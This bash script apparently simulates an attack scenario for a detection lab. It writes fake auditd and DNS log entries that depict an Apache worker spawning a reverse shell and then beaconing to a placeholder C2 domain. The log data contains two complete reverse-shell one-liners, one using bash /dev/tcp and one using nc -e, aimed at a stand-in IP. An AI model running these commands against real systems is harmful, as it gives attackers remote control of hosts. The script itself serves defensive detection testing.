#!/usr/bin/env bash
# Scenario 2: a web process spawns a reverse shell, which then beacons out
# over DNS to a suspicious domain.
# ATT&CK: T1059 (Command and Scripting Interpreter), T1071 (Application
# Layer Protocol), T1071.004 (DNS)
set -euo pipefail
cd "$(dirname "${BASH_SOURCE[0]}")/.."
source ./common.sh

label_run "2" "reverse_shell_dns_beacon"

C2_DOMAIN="x7qz9f.bad-c2-example.net"

echo "[scenario 2] simulating reverse shell + DNS beaconing ..."

# www-data (a web server worker) spawns bash, which spawns nc -e - a classic
# reverse-shell process chain and a strong detection signal on its own.
log_auditd "$(cat <<JSON
{"type":"EXECVE","timestamp":"$(now)","host":"lab-host-1","uid":"www-data","pid":4321,"ppid":4100,"exe":"/bin/bash","argv":["bash","-c","bash -i >& /dev/tcp/198.51.100.77/4444 0>&1"],"parent_exe":"/usr/sbin/apache2"}
JSON
)"

log_auditd "$(cat <<JSON
{"type":"EXECVE","timestamp":"$(now)","host":"lab-host-1","uid":"www-data","pid":4322,"ppid":4321,"exe":"/bin/nc","argv":["nc","-e","/bin/sh","198.51.100.77","4444"],"parent_exe":"/bin/bash"}
JSON
)"

# Beacon: repeated DNS lookups to a high-entropy subdomain, at a regular
# interval - the signal the ML/entropy feature in Phase 3 will key off.
for _ in $(seq 1 8); do
  log_dns "$C2_DOMAIN" "A"
  sleep 0.3
done

echo "[scenario 2] done. Check lab/data/auditd.log and lab/data/dns.log."
